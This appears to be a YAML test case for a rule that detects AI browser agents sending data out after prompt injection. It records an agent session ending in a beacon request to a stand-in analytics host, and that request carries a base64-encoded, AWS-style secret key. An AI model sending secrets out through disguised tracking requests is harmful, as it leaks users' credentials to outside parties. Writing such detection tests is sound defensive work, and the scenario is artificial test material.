rule: ai_agent_operator_browser_injection_egress.yml
subjects:
  operator:
    session: pid/100:1
    program: /Applications/Operator.app/Contents/MacOS/Operator
    agent: true
    actors: [{id: u1, name: Dev, email: dev@example.com}]
    device: dev-1
    source: probe
observations:
  - {kind: session_start, subject: operator}
  - {kind: http_request, subject: operator, url: "https://news.example.com/article/1", method: GET, request_id: r1}
  - {kind: http_request, subject: operator, url: "https://shop.example.org/item/2", method: GET, request_id: r2}
  - {kind: http_request, subject: operator, url: "https://analytics.example.net/beacon?d=QUtJQVNFQ1JFVEtFWUlEMTIzNDU2Nzg5MEFCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaMDEyMzQ1Njc4OTAxMjM0NTY3ODkw", method: GET, request_id: r3}
expect:
  action: allow
